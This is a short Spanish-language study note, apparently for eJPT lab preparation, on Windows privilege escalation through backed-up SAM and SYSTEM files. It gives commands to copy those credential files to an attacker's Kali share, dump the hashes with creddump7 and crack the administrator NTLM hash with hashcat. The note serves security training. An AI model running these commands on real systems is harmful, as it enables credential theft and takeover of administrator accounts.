- Los archivos SAM y SYSTEM se pueden usar para extraer hashes de contraseñas de usuario. Esta VM ha almacenado de forma insegura backups de los archivos SAM y SYSTEM en el C:\Windows\Repair\ directorio.

- Transfiera los archivos SAM y SYSTEM a su Kali VM:

```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\   
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

- En Kali, clone el repositorio creddump7 (el de Kali está desactualizado y no volcará hashes correctamente para Windows 10!) y úselo para volcar los hashes de los archivos SAM y SYSTEM:

```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

- Rompe el administrador NTLM hash usando hashcat:

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

Puede usar la contraseña descifrada para iniciar sesión como administrador usando winexe o PDR.

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Passing the Hash]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Registry]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Saved Creds]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]

